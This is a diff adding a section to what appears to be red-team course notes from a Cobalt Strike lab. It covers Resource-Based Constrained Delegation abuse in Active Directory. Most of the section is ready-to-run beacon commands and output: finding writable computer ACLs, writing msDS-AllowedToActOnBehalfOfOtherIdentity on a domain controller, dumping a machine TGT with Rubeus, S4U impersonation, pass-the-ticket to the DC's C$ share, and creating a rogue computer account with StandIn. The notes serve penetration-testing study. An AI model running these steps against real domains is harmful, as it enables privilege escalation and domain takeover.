@@ -807,3 +807,287 @@ Use <mark style="color:yellow;">`run klist`</mark> to view cached tickets.
 ## Resource-Based Constrained Delegation
 
 Enabling unconstrained or constrained delegation on a computer requires <mark style="color:yellow;">`SeEnableDelegationPrivilege`</mark> user right assignment on Domain Controllers, which is only granted to enterprise and domain admins.
+
+In Windows 2012, a new type of delegation called _**Resource-Based Constrained Delegation (RBCD)**_ was announced.&#x20;
+
+&#x20;_<mark style="color:yellow;">**RBCD allows the delegation configuration to be set on the target rather than the source**</mark>**.**_
+
+### What is the difference?
+
+<mark style="color:yellow;">Constrained Delegation</mark> is configured on the "front-end" service via its <mark style="color:yellow;">`msDS-AllowedToDelegateTo`</mark> attribute.&#x20;
+
+The example provided previously was where `cifs\dc-2.dev.cyberbotic.io` was in the `msDS-AllowedToDelegateTo` attribute of `SQL-2`. This allowed the `SQL-2` computer account to impersonate any user to any service on `DC-2` and `DC-2` really had no "say" over it.
+
+Essentially, <mark style="color:yellow;">RBCD</mark> reverses this concept and puts control in the hands of the "backend" service instead via a new attribute known as <mark style="color:yellow;">`msDS-AllowedToActOnBehalfOfOtherIdentity`</mark> attribute.&#x20;
+
+This attribute <mark style="color:$danger;">does not require</mark> <mark style="color:yellow;">`SeEnableDelegationPrivilege`</mark> to modify.
+
+Instead, **you only need a privilege like** <mark style="color:yellow;">`WriteProperty`</mark>, <mark style="color:yellow;">`GenericWrite`</mark> or <mark style="color:yellow;">`WriteDacl`</mark> on the computer object. This makes it much more likely to present itself as a privilege escalation / lateral movement opportunity.&#x20;
+
+### Prerequisites
+
+1. A target computer on which you can modify <mark style="color:yellow;">`msDS-AllowedToActOnBehalfOfOtherIdentity`</mark>.
+2. **Control** of another _**principal**_ that has a <mark style="color:yellow;">`SPN`</mark>.
+
+### How-to
+
+**This query will obtain every domain computer and read their ACL, filtering on the interesting results:**
+
+```
+beacon> powershell Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll|WriteDacl" -and $_.SecurityIdentifier -match "S-1-5-21-569305411-121244042-2357301523-[\d]{4,10}" }
+
+AceQualifier           : AccessAllowed
+ObjectDN               : CN=DC-2,OU=Domain Controllers,DC=dev,DC=cyberbotic,DC=io
+ActiveDirectoryRights  : Self, WriteProperty
+ObjectAceType          : All
+ObjectSID              : S-1-5-21-569305411-121244042-2357301523-1000
+InheritanceFlags       : ContainerInherit
+BinaryLength           : 56
+AceType                : AccessAllowedObject
+ObjectAceFlags         : InheritedObjectAceTypePresent
+IsCallback             : False
+PropagationFlags       : None
+SecurityIdentifier     : S-1-5-21-569305411-121244042-2357301523-1107
+AccessMask             : 40
+AuditFlags             : None
+IsInherited            : True
+AceFlags               : ContainerInherit, Inherited
+InheritedObjectAceType : Computer
+OpaqueLength           : 0
+
+beacon> powershell ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1107
+DEV\Developers
+```
+
+### Obtaining a Principal w/ a SPN
+
+**To start the attack, we need the SID of Workstation 2 (since we have elevated privileges):**
+
+```
+beacon> powershell Get-DomainComputer -Identity wkstn-2 -Properties objectSid
+
+objectsid                                   
+---------                                   
+S-1-5-21-569305411-121244042-2357301523-1109
+```
+
+### Security Descriptor Definition Language (SDDL)
+
+We will then use this SID inside of an SDDL to create a security descriptor.
+
+**The content of&#x20;**<mark style="color:yellow;">**`msDS-AllowedToActOnBehalfOfOtherIdentity`**</mark>**&#x20;must be in raw binary format:**
+
+```
+$rsd = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-569305411-121244042-2357301523-1109)"
+$rsdb = New-Object byte[] ($rsd.BinaryLength)
+$rsd.GetBinaryForm($rsdb, 0)
+```
+
+These descriptor bytes can then be used with <mark style="color:yellow;">`Set-DomainObject`</mark>.&#x20;
+
+**However, since we're working through Cobalt Strike, everything must be concatenated into a single PowerShell command:**
+
+```
+beacon> powershell $rsd = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-569305411-121244042-2357301523-1109)"; $rsdb = New-Object byte[] ($rsd.BinaryLength); $rsd.GetBinaryForm($rsdb, 0); Get-DomainComputer -Identity "dc-2" | Set-DomainObject -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity' = $rsdb} -Verbose
+
+Setting 'msDS-AllowedToActOnBehalfOfOtherIdentity' to '1 0 4 128 20 0 0 0 0 0 0 0 0 0 0 0 36 0 0 0 1 2 0 0 0 0 0 5 32 0 0 0 32 2 0 0 2 0 44 0 1 0 0 0 0 0 36 0 255 1 15 0 1 5 0 0 0 0 0 5 21 0 0 0 67 233 238 33 138 9 58 7 19 145 129 140 85 4 0 0' for object 'DC-2$'
+
+beacon> powershell Get-DomainComputer -Identity "dc-2" -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
+
+msds-allowedtoactonbehalfofotheridentity
+----------------------------------------
+{1, 0, 4, 128...}
+```
+
+Next, we use the <mark style="color:yellow;">`WKSN-2$`</mark> account to perform the <mark style="color:yellow;">`S4U`</mark> impersonation with Rubeus.
+
+The <mark style="color:yellow;">`s4u`</mark> command requires a TGT, RC4, or AES hash.
+
+**Since we already have elevated access to it, we can just extract its TGT from memory:**
+
+```
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
+
+[*] Current LUID    : 0x3e7
+
+ ------------------------------------------------------------------------------------------------------------------ 
+ | LUID     | UserName                     | Service                                       | EndTime              |
+ ------------------------------------------------------------------------------------------------------------------ 
+ | 0x3e4    | wkstn-2$ @ DEV.CYBERBOTIC.IO | krbtgt/DEV.CYBERBOTIC.IO                      | 9/13/2022 7:27:12 PM |
+
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap
+
+[*] Target service  : krbtgt
+[*] Target LUID     : 0x3e4
+[*] Current LUID    : 0x3e7
+
+  UserName                 : WKSTN-2$
+  Domain                   : DEV
+  LogonId                  : 0x3e4
+  UserSID                  : S-1-5-20
+  AuthenticationPackage    : Negotiate
+  LogonType                : Service
+  LogonTime                : 9/13/2022 9:26:48 AM
+  LogonServer              : 
+  LogonServerDNSDomain     : 
+  UserPrincipalName        : WKSTN-2$@dev.cyberbotic.io
+
+    ServiceName              :  krbtgt/DEV.CYBERBOTIC.IO
+    ServiceRealm             :  DEV.CYBERBOTIC.IO
+    UserName                 :  WKSTN-2$
+    UserRealm                :  DEV.CYBERBOTIC.IO
+    StartTime                :  9/13/2022 9:27:12 AM
+    EndTime                  :  9/13/2022 7:27:12 PM
+    RenewTill                :  9/20/2022 9:27:12 AM
+    Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
+    KeyType                  :  aes256_cts_hmac_sha1
+    Base64(key)              :  qEQBH1TdRRjZiZ0iXbeCy4Z3MsOf30l8lLTNE4InemY=
+    Base64EncodedTicket   :
+
+doIFuD[...]5JTw==
+```
+
+### Perform the `S4U` Attack
+
+```
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:WKSTN-2$ /impersonateuser:nlamb /msdsspn:cifs/dc-2.dev.cyberbotic.io /ticket:doIFuD[...]5JTw== /nowrap
+
+[*] Building S4U2self request for: 'WKSTN-2$@DEV.CYBERBOTIC.IO'
+[*] Using domain controller: dc-2.dev.cyberbotic.io (10.10.122.10)
+[*] Sending S4U2self request to 10.10.122.10:88
+[+] S4U2self success!
+[*] Got a TGS for 'nlamb' to 'WKSTN-2$@DEV.CYBERBOTIC.IO'
+[*] base64(ticket.kirbi):
+
+      doIFoD[...]0yJA==
+
+[*] Impersonating user 'nlamb' to target SPN 'cifs/dc-2.dev.cyberbotic.io'
+[*] Building S4U2proxy request for service: 'cifs/dc-2.dev.cyberbotic.io'
+[*] Using domain controller: dc-2.dev.cyberbotic.io (10.10.122.10)
+[*] Sending S4U2proxy request to domain controller 10.10.122.10:88
+[+] S4U2proxy success!
+[*] base64(ticket.kirbi) for SPN 'cifs/dc-2.dev.cyberbotic.io':
+
+      doIGcD[...]MuaW8=
+```
+
+### Finally, Pass the Ticket (PTT) Into a Logon Session for use
+
+```
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIGcD[...]MuaW8=
+
+[*] Using DEV\nlamb:FakePass
+
+[*] Showing process : False
+[*] Username        : nlamb
+[*] Domain          : DEV
+[*] Password        : FakePass
+[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
+[+] ProcessID       : 4092
+[+] Ticket successfully imported!
+[+] LUID            : 0x6cb934
+
+beacon> steal_token 4092
+[+] Impersonated DEV\bfarmer
+
+beacon> ls \\dc-2.dev.cyberbotic.io\c$
+
+ Size     Type    Last Modified         Name
+ ----     ----    -------------         ----
+          dir     08/15/2022 15:44:08   $Recycle.Bin
+          dir     08/10/2022 04:55:17   $WinREAgent
+          dir     08/10/2022 05:05:53   Boot
+          dir     08/18/2021 23:34:55   Documents and Settings
+          dir     08/19/2021 06:24:49   EFI
+          dir     08/15/2022 16:09:55   inetpub
+          dir     05/08/2021 08:20:24   PerfLogs
+          dir     08/24/2022 10:51:51   Program Files
+          dir     08/10/2022 04:06:16   Program Files (x86)
+          dir     09/12/2022 09:45:09   ProgramData
+          dir     08/15/2022 15:23:23   Recovery
+          dir     08/16/2022 12:37:38   Shares
+          dir     09/05/2022 12:03:43   System Volume Information
+          dir     08/15/2022 15:24:39   Users
+          dir     09/12/2022 09:28:56   Windows
+ 427kb    fil     08/10/2022 05:00:07   bootmgr
+ 1b       fil     05/08/2021 08:14:33   BOOTNXT
+ 1kb      fil     08/15/2022 16:16:13   dc-2.dev.cyberbotic.io_sub-ca.req
+ 12kb     fil     09/05/2022 07:25:58   DumpStack.log
+ 12kb     fil     09/13/2022 09:25:49   DumpStack.log.tmp
+ 384mb    fil     09/13/2022 09:25:49   pagefile.sys
+```
+
+### Cleanup
+
+**Simply remove the&#x20;**<mark style="color:yellow;">**`msDS-AllowedToActOnBahalfOfOtherIdentity`**</mark>**&#x20;entry on the target:**
+
+```
+beacon> powershell Get-DomainComputer -Identity dc-2 | Set-DomainObject -Clear msDS-AllowedToActOnBehalfOfOtherIdentity
+```
+
+### Don't have local admin access?
+
+You can resort to creating your own computer object. By default, even domain users can join up to 10 computers to a domain - controlled via the <mark style="color:yellow;">`ms-DS-MachineAccountQuota`</mark> attribute of the domain object.
+
+**How-to: Viewing how many computers a user can add to a domain.**
+
+```
+beacon> powershell Get-DomainObject -Identity "DC=dev,DC=cyberbotic,DC=io" -Properties ms-DS-MachineAccountQuota
+
+ms-ds-machineaccountquota
+-------------------------
+                       10
+```
+
+#### Create a computer with a random password
+
+[**StandIn**](https://github.com/FuzzySecurity/StandIn) **is a post-ex toolkit written by** [**Ruben Boonen**](https://twitter.com/FuzzySec) **and has the functionality to create a computer with a random password:**
+
+```
+beacon> execute-assembly C:\Tools\StandIn\StandIn\StandIn\bin\Release\StandIn.exe --computer EvilComputer --make
+
+[?] Using DC    : dc-2.dev.cyberbotic.io
+    |_ Domain   : dev.cyberbotic.io
+    |_ DN       : CN=EvilComputer,CN=Computers,DC=dev,DC=cyberbotic,DC=io
+    |_ Password : oIrpupAtF1YCXaw
+
+[+] Machine account added to AD..
+```
+
+### Obtaining TGT for the Fake Computer
+
+**These can then be used with&#x20;**<mark style="color:yellow;">**`asktgt`**</mark>**&#x20;to obtain a TGT for the fake computer:**
+
+```
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:EvilComputer$ /aes256:7A79DCC14E6508DA9536CD949D857B54AE4E119162A865C40B3FFD46059F7044 /nowrap
+
+[*] Action: Ask TGT
+
+[*] Using aes256_cts_hmac_sha1 hash: 7A79DCC14E6508DA9536CD949D857B54AE4E119162A865C40B3FFD46059F7044
+[*] Building AS-REQ (w/ preauth) for: 'dev.cyberbotic.io\EvilComputer$'
+[*] Using domain controller: 10.10.122.10:88
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
+      doIF8j[...]MuaW8=
+
+  ServiceName              :  krbtgt/dev.cyberbotic.io
+  ServiceRealm             :  DEV.CYBERBOTIC.IO
+  UserName                 :  EvilComputer$
+  UserRealm                :  DEV.CYBERBOTIC.IO
+  StartTime                :  9/13/2022 2:31:34 PM
+  EndTime                  :  9/14/2022 12:31:34 AM
+  RenewTill                :  9/20/2022 2:31:34 PM
+  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
+  KeyType                  :  aes256_cts_hmac_sha1
+  Base64(key)              :  /s6yAyTa1670VNAT9yYBGya/mqOU/YJSLu0XuD2ReBE=
+  ASREP (key)              :  7A79DCC14E6508DA9536CD949D857B54AE4E119162A865C40B3FFD46059F7044
+```
+
+And the rest of the attack is the same.
+
+## Shadow Credentials
+
+Whilst Kerberos pre-authentication is typically carried out using a symmetric key derived from a client's password, asymmetric keys are also possible via Public Key Cryptography for Initial Authentication (PKINIT).&#x20;
+
+If a PKI solution is in place, such as Active Directory Certificate Services, the Domain Controllers and domain members exchange their public keys via the appropriate Certificate Authority. This is called the Certificate Trust Model.
